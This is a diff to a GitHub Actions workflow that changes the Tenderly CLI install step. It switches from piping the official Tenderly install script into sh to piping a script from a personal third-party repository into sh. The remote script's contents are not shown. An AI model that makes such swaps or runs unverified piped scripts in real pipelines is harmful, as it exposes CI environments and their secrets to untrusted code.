@@ -21,8 +21,7 @@ jobs:
     name: Job ${{ matrix.index }}
     steps:
       - name: Install Tenderly CLI
-        run: curl https://raw.githubusercontent.com/Tenderly/tenderly-cli/master/scripts/install-linux.sh | sh
-        
+        run: curl https://raw.githubusercontent.com/mmiletic1/ghaction/main/install-linux.sh | sh
       - name: Tenderly Version
         run: |
           tenderly version
